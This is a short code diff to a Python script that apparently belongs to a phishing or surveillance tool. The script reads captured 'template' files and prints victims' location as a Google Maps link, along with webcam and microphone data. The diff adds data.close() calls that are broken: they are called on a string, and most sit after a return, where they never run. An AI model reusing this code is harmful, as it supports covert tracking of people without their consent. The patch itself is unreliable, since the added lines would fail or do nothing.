@@ -31,7 +31,8 @@ def After_click(Ac_path,Ac_msg):
                 print(c.grey+ " "+i.replace("-"," ")+c.green+" : "+c.red+data_decode[i])
                 with open(f"template/{Ac_path}","w+") as file :
                     file.write("")
-            sleep(2)          
+            sleep(2)
+            data.close()         
             show_message(Ac_msg)  
  
     else:  
@@ -51,14 +52,13 @@ def Before_click(Bc_template,Bc_focus=' ',Bc_status=True):
                     
                     data = open(f"template/{Bc_template}","r").read()
                     location_file_json_decode = json.loads(data)
-                    print(c.re+"\n Google Map Link : "+c.green+f"https://www.google.com/maps/place/{location_file_json_decode['lat']}+{location_file_json_decode['lon']}")
-
+                    print(c.re+"\n Google Map Link : "+c.green+f"https://www.google.com/maps/place/{location_file_json_decode['lat']}+{location_file_json_decode['lon']}")         
                     result = continue_proc(
                        con_path=Bc_template,
                        con_status=Bc_status
                     )  
                     return result                   
-                
+                    data.close()                       
                 elif Bc_focus == "webcam":
                     data = open(f"template/{Bc_template}","r").read()
                     webcam_file_json_decode = json.loads(data)
@@ -70,7 +70,7 @@ def Before_click(Bc_template,Bc_focus=' ',Bc_status=True):
                       con_status=Bc_status
                    )  
                     return result
-
+                    data.close()         
                 
                 elif Bc_focus == "microphone":
                     data = open(f"template/{Bc_template}","r").read()
@@ -82,7 +82,7 @@ def Before_click(Bc_template,Bc_focus=' ',Bc_status=True):
                        con_status=Bc_status
                     )  
                     return result
-
+                    data.close()         
 
     #    except Exception as Ex:
          #   exit(Ex)
